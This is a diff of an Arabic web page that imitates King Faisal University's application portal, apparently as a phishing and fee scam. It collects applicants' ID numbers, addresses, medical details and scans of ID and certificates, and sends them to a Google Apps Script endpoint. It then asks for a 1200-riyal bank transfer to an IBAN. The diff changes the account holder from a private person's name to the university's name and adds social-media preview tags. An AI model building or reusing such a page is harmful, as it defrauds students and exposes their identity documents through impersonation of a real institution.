@@ -1,336 +1,434 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
-<link rel="icon" type="image/png" href="kfu_logo.png">
+
+<!-- OpenGraph (معاينة عند مشاركة الرابط) -->
+<meta property="og:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
+<meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
+<meta property="og:image" content="https://i.pinimg.com/736x/51/85/7e/51857e7e1a55e654d7c612c5f8ac200c.jpg">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+
+<link rel="icon" href="kfu_logo.png" />
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
 <style>
-:root{
-  --uf-green:#0b6b44;
-  --gold:#d4af37;
-  --bg:#f5f6f8;
-  --card:#ffffff;
-  --muted:#6b6b6b;
-}
-*{box-sizing:border-box}
-body{
-  margin:0;
-  font-family:"Cairo","Segoe UI",Tahoma,sans-serif;
-  background:var(--uf-green);
-  color:#fff;
-}
-.login-container{
-  min-height:100vh;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
-  text-align:center;
-  padding:20px;
-}
-.logo-circle{
-  width:120px;
-  height:120px;
-  border-radius:50%;
-  background:#fff;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  margin:0 auto 20px;
-}
-.logo-circle img{
-  width:80%;
-  height:auto;
-}
-h1{
-  margin:10px 0 5px;
-  font-size:28px;
-  font-weight:800;
-}
-p.subtitle{
-  margin:0 0 20px;
-  font-size:16px;
-}
-.quick-access a{
-  display:inline-flex;
-  align-items:center;
-  gap:10px;
-  background:#fff;
-  color:var(--uf-green);
-  padding:12px 20px;
-  border-radius:8px;
-  font-weight:600;
-  text-decoration:none;
-  transition:0.3s;
-  margin-top:15px;
-}
-.quick-access a:hover{
-  background:var(--gold);
-  color:#fff;
-}
-.container{
-  max-width:1150px;
-  margin:20px auto;
-  background:var(--card);
-  border-radius:14px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.08);
-  padding:36px 48px;
-  border-top:6px solid var(--uf-green);
-  display:none;
-  position:relative;
-  z-index:100;
-  color:#222;
-}
-header.brand{
-  display:flex;
-  align-items:center;
-  gap:14px;
-  margin-bottom:15px;
-}
-header .logo{
-  width:72px;
-  height:72px;
-  border-radius:10px;
-  background:linear-gradient(135deg,var(--uf-green),#064b33);
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  color:#fff;
-  font-weight:800;
-  font-size:18px;
-  box-shadow:0 4px 14px rgba(11,107,68,0.15) inset;
-}
-h1.form-title{
-  margin:0;
-  font-size:22px;
-  color:var(--uf-green);
-}
-.subtitle{color:#666; font-size:14px; margin:4px 0 0}
-.grid2{display:grid;grid-template-columns:1fr 1fr;gap:28px 36px;margin-top:20px}
-label{display:block;font-weight:600;color:var(--uf-green);margin-bottom:6px;font-size:14px}
-input,select,textarea{
-  width:100%;
-  padding:12px;
-  border-radius:10px;
-  border:1px solid #dcdcdc;
-  background:#fbfbfb;
-  font-size:14px;
-}
-textarea{min-height:90px;resize:vertical}
-.section-title{margin-top:20px;margin-bottom:8px;font-weight:700;color:#444;border-bottom:1px dashed #eee;padding-bottom:6px}
-.files-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-.account-section{display:flex;align-items:center;justify-content:space-between;gap:12px;background:#fbfbfb;padding:14px;border-radius:10px;border:1px solid #efecec;margin-top:20px}
-.copy-btn{background:var(--gold);color:#fff;border:none;padding:10px 16px;border-radius:8px;cursor:pointer;font-weight:700}
-.submit-area{text-align:center;margin-top:26px;display:flex;justify-content:center;gap:12px}
-.btn{background:var(--uf-green);color:#fff;border:none;padding:12px 36px;border-radius:10px;font-weight:700;cursor:pointer;font-size:16px}
-.btn.cancel{background:#9e9e9e}
-.toast{position:fixed;top:20px;right:20px;background:var(--uf-green);color:#fff;padding:12px 18px;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.15);opacity:0;transform:translateY(-10px);transition:all .4s ease;z-index:999}
-.toast.show{opacity:1;transform:translateY(0)}
-@media (max-width:900px){.grid2{grid-template-columns:1fr}.files-row{grid-template-columns:1fr}.header.brand{flex-direction:column;align-items:flex-start;gap:10px}}
+  :root{
+    --uf-green:#0b6b44;
+    --uf-green-dark:#064b33;
+    --gold:#d4af37;
+    --bg:#f5f6f8;
+    --card:#ffffff;
+    --muted:#6b6b6b;
+    --radius:12px;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:"Cairo",system-ui,Arial,sans-serif;background:linear-gradient(180deg,var(--uf-green) 0%, #0c6b45 45%, #f5f6f8 100%);color:#222;direction:rtl}
+  /* MAIN HERO (الصفحة الرئيسية الخضراء) */
+  .hero{
+    min-height:72vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:28px 18px;
+    text-align:center;
+    color:#fff;
+  }
+  .hero-card{
+    width:100%;
+    max-width:920px;
+    background:linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
+    border-radius:18px;
+    padding:28px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.12);
+    border:1px solid rgba(255,255,255,0.06);
+  }
+  .logo-wrap{display:flex;flex-direction:column;align-items:center;gap:12px;margin-bottom:6px}
+  .logo-circle{
+    width:120px;height:120px;border-radius:999px;background:#fff;display:flex;align-items:center;justify-content:center;padding:14px;
+    box-shadow:0 8px 24px rgba(0,0,0,0.12);
+  }
+  .logo-circle img{width:100%;height:100%;object-fit:contain}
+  .site-title{font-size:26px;font-weight:800;margin:0;color:#fff}
+  .site-sub{margin:6px 0 16px;color:rgba(255,255,255,0.95);font-size:15px}
+  .hero-grid{display:flex;gap:18px;align-items:center;justify-content:center;flex-wrap:wrap}
+  .login-box{
+    background:rgba(255,255,255,0.95);
+    color:#111;
+    border-radius:12px;padding:14px 16px;width:320px;
+    box-shadow:0 8px 20px rgba(0,0,0,0.06);
+    text-align:right;
+  }
+  .login-box h3{margin:0 0 8px;font-size:16px;color:var(--uf-green)}
+  .input{display:flex;align-items:center;gap:8px;border:1px solid #e6e6e6;background:#fff;padding:8px;border-radius:8px;margin-bottom:10px}
+  .input input{border:0;outline:none;font-size:14px;width:100%;padding:6px}
+  .primary-btn{
+    display:inline-flex;align-items:center;gap:8px;background:linear-gradient(90deg,var(--gold),#f0c84a);color:#111;padding:10px 14px;border-radius:10px;border:0;font-weight:800;cursor:pointer;
+    box-shadow:0 8px 18px rgba(0,0,0,0.12)
+  }
+  .secondary-link{display:inline-block;margin-top:10px;color:rgba(255,255,255,0.95);text-decoration:underline;cursor:pointer}
+  /* Registration container (hidden initially) */
+  .container{
+    display:none;
+    max-width:1150px;
+    margin:26px auto 80px;
+    background:var(--card);
+    border-radius:14px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.08);
+    padding:28px;
+    border-top:6px solid var(--uf-green);
+    color:#222;
+  }
+  header.form-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:12px}
+  header.form-head .logo-mini{width:64px;height:64px;border-radius:10px;background:linear-gradient(135deg,var(--uf-green),var(--uf-green-dark));display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800}
+  h1.form-title{margin:0;font-size:20px;color:var(--uf-green)}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+  label{display:block;font-weight:700;color:var(--uf-green);margin-bottom:6px}
+  input,select,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid #ddd;background:#fff;font-size:14px}
+  textarea{min-height:96px;resize:vertical}
+  .files-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .account-section{display:flex;justify-content:space-between;align-items:center;background:#fbfbfb;padding:12px;border-radius:10px;border:1px solid #eee;margin-top:12px}
+  .copy-btn{background:var(--gold);color:#fff;border:0;padding:8px 12px;border-radius:8px;font-weight:800;cursor:pointer}
+  .submit-row{display:flex;gap:12px;justify-content:center;margin-top:18px}
+  .btn{background:var(--uf-green);color:#fff;border:0;padding:12px 28px;border-radius:10px;font-weight:800;cursor:pointer}
+  .btn.gray{background:#9e9e9e}
+  .note{font-size:13px;color:#666;text-align:center;margin-top:12px}
+  /* PAYMENT page (after submission) */
+  .payment-panel{display:none;max-width:780px;margin:36px auto;padding:20px;background:#fff;border-radius:12px;box-shadow:0 12px 30px rgba(0,0,0,0.08);color:#222}
+  .payment-panel h2{color:var(--uf-green);margin:0 0 8px}
+  .payment-panel p{color:#333;margin:0 0 12px}
+  .payment-info{background:#fbfbfb;padding:14px;border-radius:10px;margin-bottom:12px}
+  .payment-info .row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px dashed #eee}
+  .payment-info .row:last-child{border-bottom:0}
+  .upload-row{display:flex;gap:12px;align-items:center}
+  .upload-row input[type=file]{flex:1}
+  .final-msg{display:none;text-align:center;padding:28px;color:var(--uf-green);font-weight:800}
+  /* toast */
+  .toast{position:fixed;top:18px;left:18px;right:auto;z-index:9999;background:var(--uf-green);color:#fff;padding:10px 14px;border-radius:10px;opacity:0;transform:translateY(-10px);transition:all .3s}
+  .toast.show{opacity:1;transform:translateY(0)}
+  @media(max-width:880px){
+    .grid2{grid-template-columns:1fr}
+    .hero{padding:22px}
+    .login-box{width:100%}
+  }
 </style>
 </head>
 <body>
 
-<div class="login-container">
-  <div class="logo-circle"><img src="kfu_logo.png" alt="شعار جامعة الملك فيصل"></div>
-  <h1>جامعة الملك فيصل</h1>
-  <p class="subtitle">بوابة الخدمات الأكاديمية</p>
-  <div class="quick-access">
-    <a href="#" onclick="showForm()"><i class="fas fa-user-graduate"></i>تقديم طلب جديد</a>
+<!-- Toast -->
+<div id="toast" class="toast" role="status" aria-live="polite"></div>
+
+<!-- HERO / الصفحة الرئيسية (خضراء) -->
+<section class="hero" id="homeSection">
+  <div class="hero-card" role="region" aria-label="بوابة الخدمات الأكاديمية">
+    <div class="logo-wrap">
+      <div class="logo-circle" aria-hidden="true"><img src="kfu_logo.png" alt="شعار جامعة الملك فيصل"></div>
+      <div class="site-title">جامعة الملك فيصل</div>
+      <div class="site-sub">بوابة الخدمات الأكاديمية — التقديم الإلكتروني والقبول</div>
+    </div>
+
+    <div class="hero-grid">
+      <!-- Login box (مطابق للي طلبت) -->
+      <div class="login-box" aria-labelledby="loginTitle">
+        <h3 id="loginTitle">تسجيل الدخول</h3>
+        <div class="input"><i class="fas fa-user" style="color:var(--uf-green)"></i><input id="loginUser" placeholder="اسم المستخدم أو الإيميل" /></div>
+        <div class="input"><i class="fas fa-lock" style="color:var(--uf-green)"></i><input id="loginPass" type="password" placeholder="كلمة المرور" /></div>
+        <button class="primary-btn" onclick="fakeLogin()">دخول</button>
+        <div style="font-size:13px;margin-top:10px;color:rgba(255,255,255,0.9)">أو اضغط أدناه لبدء طلب جديد</div>
+      </div>
+
+      <!-- Quick action: تقديم طلب جديد -->
+      <div style="display:flex;flex-direction:column;gap:12px;align-items:center;justify-content:center">
+        <a class="primary-btn" style="background:linear-gradient(90deg,var(--gold),#f0c84a)" onclick="startRegistration()">
+          <i class="fas fa-user-graduate"></i>
+          تقديم طلب جديد
+        </a>
+        <a class="secondary-link" onclick="scrollToInfo()">معلومات عن القبول</a>
+      </div>
+    </div>
   </div>
-</div>
+</section>
 
-<!-- نموذج التسجيل -->
-<div class="container" id="registrationForm">
-<form id="registrationFormForm" action="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec" method="POST" enctype="multipart/form-data">
-<header class="brand">
-  <div class="logo">KFU</div>
-  <div>
-    <h1 class="form-title">نموذج التسجيل - جامعة الملك فيصل</h1>
-    <p class="subtitle">يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة.</p>
+<!-- Registration form (hidden until pressed) -->
+<section class="container" id="registrationContainer" aria-hidden="true">
+  <form id="registrationForm" enctype="multipart/form-data" novalidate>
+    <header class="form-head">
+      <div style="display:flex;gap:12px;align-items:center">
+        <div class="logo-mini">KFU</div>
+        <div>
+          <h1 class="form-title">نموذج التسجيل - جامعة الملك فيصل</h1>
+          <div class="subtitle">املأ جميع الحقول والمرفقات المطلوبة بدقة</div>
+        </div>
+      </div>
+      <div style="text-align:left">
+        <small style="color:#666">الرسوم: <strong style="color:#000">1200 ريال</strong></small>
+      </div>
+    </header>
+
+    <div class="grid2" role="group" aria-label="حقول المتقدم">
+      <div>
+        <label>الاسم الكامل *</label>
+        <input name="fullName" required>
+
+        <label>الجنس *</label>
+        <select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select>
+
+        <label>الجنسية *</label>
+        <select name="nationality" required>
+          <option value="">اختر</option><option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option>
+          <option>العراق</option><option>لبنان</option><option>فلسطين</option><option>السودان</option><option>تونس</option>
+        </select>
+
+        <label>الدولة (مكان الإقامة) *</label>
+        <select name="country" required><option value="">اختر</option><option>المملكة العربية السعودية</option><option>أخرى</option></select>
+
+        <label>رقم الهوية / الإقامة *</label>
+        <input name="idNumber" required>
+
+        <label>تاريخ الميلاد *</label>
+        <input type="date" name="birthDate" required>
+
+        <label>المدينة *</label>
+        <input name="city" required>
+
+        <label>العنوان *</label>
+        <textarea name="address" placeholder="شارع - حي - رمز بريدي" required></textarea>
+
+        <label>رقم الجوال (واتساب) *</label>
+        <input name="phone" required>
+
+        <label>البريد الإلكتروني *</label>
+        <input type="email" name="email" required>
+      </div>
+
+      <div>
+        <label>نوع المؤهل السابق *</label>
+        <select name="prevDegree" required><option value="">اختر</option><option>ثانوي</option><option>دبلوم</option><option>بكالوريوس</option></select>
+
+        <label>سنة التخرج *</label>
+        <input type="number" name="gradYear" min="1900" max="2100" required>
+
+        <label>اسم المدرسة / الجامعة السابقة</label>
+        <input name="prevInstitute">
+
+        <label>المعدل / النسبة</label>
+        <input name="gpa">
+
+        <label>التخصص المطلوب *</label>
+        <input name="desiredMajor" required>
+
+        <label>نوع الدراسة *</label>
+        <select name="studyType" required><option value="">اختر</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option></select>
+
+        <label>الكلية / القسم *</label>
+        <select name="faculty" required>
+          <option value="">اختر</option><option>كلية الطب</option><option>كلية الهندسة</option><option>كلية العلوم</option>
+        </select>
+
+        <label>الحالة الطبية إن وُجدت</label>
+        <input name="medicalInfo" placeholder="إن وُجد">
+        <div class="section-title">جهة الاتصال في حالات الطوارئ</div>
+        <label>الاسم</label><input name="emergencyName">
+        <label>صلة القرابة</label><input name="emergencyRelation">
+        <label>رقم الطوارئ</label><input name="emergencyPhone">
+      </div>
+    </div>
+
+    <div class="section-title">المرفقات المطلوبة</div>
+    <div class="files-row">
+      <div><label>صورة الهوية / الإقامة *</label><input type="file" name="fileId" accept="image/*,application/pdf" required></div>
+      <div><label>صورة الشهادة / المؤهل *</label><input type="file" name="fileCertificate" accept="image/*,application/pdf" required></div>
+    </div>
+
+    <div class="files-row" style="margin-top:12px">
+      <div><label>صورة شخصية *</label><input type="file" name="filePhoto" accept="image/*" required></div>
+      <div><label>مرفق إيصال الدفع (بعد التحويل يمكنك رفعه في صفحة الرسوم)</label><input type="file" name="fileReceipt" accept="image/*,application/pdf"></div>
+    </div>
+
+    <div class="account-section" style="margin-top:12px">
+      <div>
+        <div style="font-size:13px;color:#666">الرسوم (ستدفع بعد إرسال الطلب):</div>
+        <div style="font-weight:800;color:var(--uf-green)">1200 ريال</div>
+      </div>
+      <div style="text-align:left">
+        <button type="button" class="copy-btn" id="copyAmountBtn">معلومات الرسوم</button>
+      </div>
+    </div>
+
+    <div style="margin-top:12px">
+      <label><input type="checkbox" name="agree" required> أقر بأن البيانات صحيحة وأتعهد بإرفاق الإثبات عند السداد.</label>
+    </div>
+
+    <div class="submit-row">
+      <button type="submit" class="btn" id="submitApplicationBtn"><i class="fas fa-paper-plane"></i>&nbsp; إرسال الطلب</button>
+      <button type="reset" class="btn gray">إعادة تعيين</button>
+    </div>
+
+    <div class="note">جميع الحقوق محفوظة © جامعة الملك فيصل</div>
+  </form>
+</section>
+
+<!-- Payment panel - تظهر بعد نجاح إرسال الطلب -->
+<section class="payment-panel" id="paymentPanel" aria-hidden="true">
+  <h2>إجراءات دفع الرسوم</h2>
+  <p>شكرًا — تم استلام بياناتك. الآن يرجى تنفيذ تحويل الرسوم وإرفاق إيصال الدفع أدناه.</p>
+
+  <div class="payment-info" aria-live="polite">
+    <div class="row"><div>رقم الحساب</div><div style="font-weight:800">SA1980000857608010276380</div></div>
+    <div class="row"><div>اسم صاحب الحساب</div><div style="font-weight:700">جامعة الملك فيصل</div></div>
+    <div class="row"><div>المبلغ المطلوب</div><div style="font-weight:700">1200 ريال</div></div>
   </div>
-</header>
 
-<div class="grid2">
-<div>
-<label>الاسم الكامل *</label><input type="text" name="fullName" required>
-<label>الجنس *</label>
-<select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select>
-<label>الجنسية *</label>
-<select name="nationality" required>
-<option value="">اختر</option>
-<option>السعودية</option>
-<option>اليمن</option>
-<option>مصر</option>
-<option>سوريا</option>
-<option>الأردن</option>
-<option>العراق</option>
-<option>لبنان</option>
-<option>فلسطين</option>
-<option>السودان</option>
-<option>تونس</option>
-<option>المغرب</option>
-<option>الإمارات</option>
-<option>الكويت</option>
-<option>البحرين</option>
-<option>عمان</option>
-<option>قطر</option>
-<option>تركيا</option>
-<option>أفغانستان</option>
-<option>باكستان</option>
-<option>الهند</option>
-<option>إندونيسيا</option>
-<option>Other</option>
-</select>
-<label>الدولة (مكان الإقامة) *</label>
-<select name="country" required>
-<option value="">اختر الدولة</option>
-<option>المملكة العربية السعودية</option>
-<option>اليمن</option>
-<option>مصر</option>
-<option>الإمارات</option>
-<option>الكويت</option>
-<option>البحرين</option>
-<option>عمان</option>
-<option>قطر</option>
-<option>الأردن</option>
-<option>سوريا</option>
-<option>لبنان</option>
-<option>السودان</option>
-<option>المغرب</option>
-<option>تونس</option>
-<option>أخرى</option>
-</select>
-<label>رقم الهوية / الإقامة *</label><input type="text" name="idNumber" required>
-<label>تاريخ الميلاد *</label><input type="date" name="birthDate" required>
-<label>المدينة *</label><input type="text" name="city" required>
-<label>العنوان بالتفصيل *</label><textarea name="address" placeholder="شارع - حي - رمز بريدي" required></textarea>
-<label>رقم الجوال *</label><input type="tel" name="phone" required>
-<label>البريد الإلكتروني *</label><input type="email" name="email" required>
-</div>
+  <form id="paymentForm" enctype="multipart/form-data">
+    <label>المبلغ المحول (ريال)</label>
+    <input name="paidAmount" value="1200" required>
 
-<div>
-<label>نوع المؤهل السابق *</label>
-<select name="prevDegree" required>
-<option value="">اختر...</option>
-<option>ثانوي</option>
-<option>دبلوم</option>
-<option>بكالوريوس</option>
-<option>ماجستير</option>
-</select>
-<label>سنة التخرج *</label><input type="number" name="gradYear" min="1900" max="2100" required>
-<label>اسم المدرسة / الجامعة السابقة</label><input type="text" name="prevInstitute">
-<label>المعدل / النسبة</label><input type="text" name="gpa">
-<label>التخصص المطلوب *</label><input type="text" name="desiredMajor" required>
-<label>نوع الدراسة *</label>
-<select name="studyType" required><option value="">اختر...</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option></select>
-<label>الكلية / القسم *</label>
-<select name="faculty" required>
-<option value="">اختر الكلية</option>
-<option>كلية الطب</option>
-<option>كلية الهندسة</option>
-<option>كلية العلوم</option>
-<option>كلية الآداب</option>
-<option>كلية إدارة الأعمال</option>
-<option>كلية الحاسبات وتقنية المعلومات</option>
-<option>كلية التربية</option>
-<option>كلية القانون</option>
-<option>كلية الصحة العامة</option>
-</select>
-<label>هل لديك أي حالة طبية هامة؟</label>
-<input type="text" name="medicalInfo" placeholder="إن وُجد">
-<div class="section-title">جهة الاتصال في حالات الطوارئ</div>
-<label>اسم جهة الاتصال للطوارئ</label><input type="text" name="emergencyName" placeholder="اسم قريب">
-<label>صلة القرابة</label><input type="text" name="emergencyRelation" placeholder="أم/أب/أخ/صديق">
-<label>رقم الطوارئ</label><input type="tel" name="emergencyPhone" placeholder="رقم جوال للطوارئ">
-</div>
-</div>
+    <label>البنك المحول منه</label>
+    <input name="fromBank" placeholder="اسم البنك" required>
 
-<div class="section-title">المرفقات المطلوبة</div>
-<div class="files-row">
-<div><label>صورة الهوية / الإقامة *</label><input type="file" name="fileId" accept="image/*,application/pdf" required></div>
-<div><label>صورة الشهادة / المؤهل *</label><input type="file" name="fileCertificate" accept="image/*,application/pdf" required></div>
-</div>
-<div class="files-row">
-<div><label>صورة شخصية *</label><input type="file" name="filePhoto" accept="image/*" required></div>
-<div><label>إيصال الدفع</label><input type="file" name="fileReceipt" accept="image/*,application/pdf"></div>
-</div>
+    <label>تاريخ العملية</label>
+    <input type="date" name="transactionDate" required>
 
-<div class="account-section">
-<div>
-<div class="bank-name">رقم الحساب:</div>
-<div style="font-weight:800;color:var(--uf-green)">SA1980000857608010276380</div>
-<div>الرسوم: 1200 ريال</div>
-</div>
-<div><button type="button" class="copy-btn" id="copyAccountBtn">نسخ رقم الحساب</button></div>
-</div>
+    <label>رقم مرجع التحويل</label>
+    <input name="transactionId" placeholder="مثال: 123456789" required>
 
-<div style="margin-top:16px">
-<label><input type="checkbox" name="agree" required> أقرّ بأن جميع البيانات المدخلة صحيحة.</label>
-</div>
+    <div class="upload-row" style="margin-top:12px">
+      <label style="min-width:110px">إرفاق إيصال الدفع</label>
+      <input type="file" name="receiptFile" accept="image/*,application/pdf" required>
+    </div>
 
-<div class="submit-area">
-<button type="submit" class="btn">إرسال الطلب</button>
-<button type="reset" class="btn cancel">إلغاء</button>
-</div>
+    <div style="margin-top:18px;display:flex;gap:12px;justify-content:center">
+      <button type="submit" class="btn"><i class="fas fa-upload"></i>&nbsp; إرسال إثبات الدفع</button>
+      <button type="button" class="btn gray" onclick="downloadIban()">نسخ رقم الحساب</button>
+    </div>
+  </form>
 
-</form>
-</div>
-
-<div class="toast" id="toast"></div>
+  <div id="finalMessage" class="final-msg" role="status" aria-live="polite">
+    تم استلام إثبات الدفع — شكراً. سنراجع الإيصال ونتواصل معك لإرسال الرقم الجامعي.
+  </div>
+</section>
 
 <script>
-function showForm(){
-  document.getElementById('registrationForm').style.display='block';
-  document.querySelector('.login-container').style.display='none';
+/* CONFIG - ضع رابط Google Apps Script هنا */
+const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec';
+
+/* عناصر DOM */
+const registrationContainer = document.getElementById('registrationContainer');
+const registrationForm = document.getElementById('registrationForm');
+const paymentPanel = document.getElementById('paymentPanel');
+const paymentForm = document.getElementById('paymentForm');
+const toast = document.getElementById('toast');
+const submitBtn = document.getElementById('submitApplicationBtn');
+
+/* مساعدة عرض الرسائل القصيرة */
+function showToast(msg, ms=2200){
+  toast.textContent = msg; toast.classList.add('show');
+  setTimeout(()=>toast.classList.remove('show'), ms);
 }
 
-document.getElementById('copyAccountBtn').addEventListener('click', ()=>{
-  const text='SA1980000857608010276380';
-  navigator.clipboard.writeText(text);
-  showToast('✅ تم نسخ رقم الحساب');
+/* تفعيل البدء بالتسجيل من الزر في الهيرو */
+function startRegistration(){
+  document.getElementById('homeSection').scrollIntoView({behavior:'smooth'});
+  // اظهار النموذج
+  registrationContainer.style.display = 'block';
+  registrationContainer.setAttribute('aria-hidden','false');
+  window.scrollTo({top: document.getElementById('registrationContainer').offsetTop - 20, behavior:'smooth'});
+}
+
+/* نسخة رقم الحساب للطالب يعرف المكان اللي يدفع فيه */
+function downloadIban(){
+  navigator.clipboard.writeText('SA1980000857608010276380').then(()=> showToast('✅ تم نسخ رقم الحساب'));
+}
+
+/* زر معلومات الرسوم داخل النموذج */
+document.getElementById('copyAmountBtn').addEventListener('click', ()=>{
+  showToast('بعد الإرسال ستظهر لك صفحة دفع فيها رقم الحساب وطريقة رفع الإثبات.');
 });
 
-function showToast(msg){
-  const toast=document.getElementById('toast');
-  toast.textContent=msg;
-  toast.classList.add('show');
-  setTimeout(()=>toast.classList.remove('show'),2500);
+/* إجراء وهمي للدخول (غير مرتبط بخدمة حقيقية) */
+function fakeLogin(){
+  const u = document.getElementById('loginUser').value.trim();
+  const p = document.getElementById('loginPass').value.trim();
+  if(!u || !p){ showToast('أدخل اسم المستخدم وكلمة المرور للمتابعة'); return; }
+  showToast('تم تسجيل الدخول (وهمياً) — يمكنك الآن تقديم الطلب أو تسجيل الخروج');
 }
 
-// إرسال النموذج
-document.getElementById('registrationFormForm').addEventListener('submit', function(e){
+/* ===== إرسال نموذج التسجيل (Application) ===== */
+let applicationSent = false;
+registrationForm.addEventListener('submit', async function(e){
   e.preventDefault();
-  const fd=new FormData(this);
-  fetch(this.action,{method:'POST',body:fd})
-  .then(res=>{
-    if(res.ok){
-      showToast('✅ تم إرسال الطلب بنجاح!');
-      this.reset();
-      showPaymentForm();
-    } else showToast('❌ حدث خطأ، حاول لاحقاً.');
-  }).catch(()=>showToast('❌ فشل الاتصال، تحقق من الإنترنت.'));
+  if(applicationSent){ showToast('لقد تم إرسال الطلب مسبقاً'); return; }
+
+  // تحقق بسيط للـ required HTML كافٍ — نجمع البيانات
+  const fd = new FormData(registrationForm);
+
+  // أضف ميتا لو أردت (منع تكرار، معرف الطلب)
+  fd.append('_submissionId', 'APP-'+Math.random().toString(36).slice(2,10).toUpperCase());
+  fd.append('_submittedAt', new Date().toISOString());
+
+  // إظهار انتظار
+  submitBtn.disabled = true;
+  submitBtn.textContent = 'جاري الإرسال...';
+
+  try{
+    const res = await fetch(APPS_SCRIPT_URL, { method:'POST', body: fd });
+    if(!res.ok) throw new Error('HTTP '+res.status);
+    // نجاح الإرسال
+    applicationSent = true;
+    showToast('✅ تم إرسال الطلب بنجاح');
+    // إخفاء النموذج وإظهار واجهة الدفع
+    registrationContainer.style.display = 'none';
+    paymentPanel.style.display = 'block';
+    window.scrollTo({top: paymentPanel.offsetTop - 20, behavior:'smooth'});
+  }catch(err){
+    console.error(err);
+    showToast('❌ فشل إرسال الطلب. حاول مرة أخرى');
+  } finally {
+    submitBtn.disabled = false;
+    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i>&nbsp; إرسال الطلب';
+  }
 });
 
-// بعد الإرسال، عرض صفحة الرسوم (نافذة منفصلة)
-function showPaymentForm(){
-  const container=document.getElementById('registrationForm');
-  container.innerHTML=`
-  <h2 style="color:var(--uf-green);text-align:center">تم استلام جميع بياناتك!</h2>
-  <p style="text-align:center;color:#555">سيتم التواصل معك عبر الواتساب أو البريد الإلكتروني لإرسال الرقم الجامعي.</p>
-  <div class="account-section" style="justify-content:center;margin-top:20px">
-  <div>
-  <div class="bank-name">رقم الحساب:</div>
-  <div style="font-weight:800;color:var(--uf-green)">SA1980000857608010276380</div>
-  <div>اسم صاحب الحساب: عبدالله محمد</div>
-  <div>المبلغ: 1200 ريال</div>
-  <div style="margin-top:10px"><label>رفع إيصال الدفع:</label><input type="file" style="padding:8px;border-radius:6px"></div>
-  </div>
-  </div>`;
-}
-</script>
+/* ===== إرسال إثبات الدفع (Payment Proof) ===== */
+paymentForm.addEventListener('submit', async function(e){
+  e.preventDefault();
+  // من الأفضل منع إرسال إثبات الدفع قبل أن يكون هناك طلب مسبق
+  if(!applicationSent){
+    showToast('لم يتم تسجيل الطلب بعد. أرسل طلبك أولاً.');
+    return;
+  }
 
+  const fd = new FormData(paymentForm);
+  fd.append('_submissionId', 'APP-FEE-'+Math.random().toString(36).slice(2,10).toUpperCase());
+  fd.append('_submittedAt', new Date().toISOString());
+  // أيضاً نرفق معلومة أن هذا إيصال مرتبط بطلب
+  fd.append('linkedToApplication','true');
+
+  // إرسال إلى نفس Google Apps Script — يمكنك تعديل لعنوان آخر إن أردت
+  try{
+    const btn = paymentForm.querySelector('button[type="submit"]');
+    btn.disabled = true;
+    btn.textContent = 'جاري إرسال إثبات الدفع...';
+    const res = await fetch(APPS_SCRIPT_URL, { method:'POST', body: fd });
+    if(!res.ok) throw new Error('HTTP '+res.status);
+    showToast('✅ تم استلام إثبات الدفع');
+    // إظهار رسالة نهائية
+    paymentForm.style.display = 'none';
+    document.getElementById('finalMessage').style.display = 'block';
+    // منع إعادة التقديم خلال هذه الجلسة
+    // (لو أردت تتبع دائماً: خزّن حالة على السيرفر)
+  }catch(err){
+    console.error(err);
+    showToast('❌ فشل إرسال إثبات الدفع. حاول مرة أخرى');
+  }
+});
+
+/* دوال مساعدة */
+function showForm(){ startRegistration(); }
+function scrollToInfo(){ window.scrollTo({top: document.body.scrollHeight, behavior:'smooth'}); }
+</script>
 </body>
-</html>
+      </html>
